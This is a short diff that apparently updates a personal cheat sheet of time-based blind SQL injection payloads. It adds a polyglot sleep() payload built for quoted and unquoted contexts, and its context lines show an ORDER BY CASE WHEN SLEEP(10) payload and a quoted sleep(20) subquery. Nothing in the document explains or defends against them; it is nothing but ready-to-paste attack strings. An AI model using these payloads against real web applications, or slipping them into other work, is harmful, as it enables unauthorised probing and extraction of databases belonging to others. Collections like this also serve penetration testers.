@@ -1,4 +1,6 @@
 
+(select(0)from(select(sleep(6)))v)/%27%2B(select(0)from(select(sleep(6)))v)%2B%27%22%2B(select(0)from(select(sleep(6)))v)%2B%22/&
+
 &order=asc,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END)) //time based
 
 ‘+(select*from(select(sleep(20)))a)+’ //this is for time based sql injection 
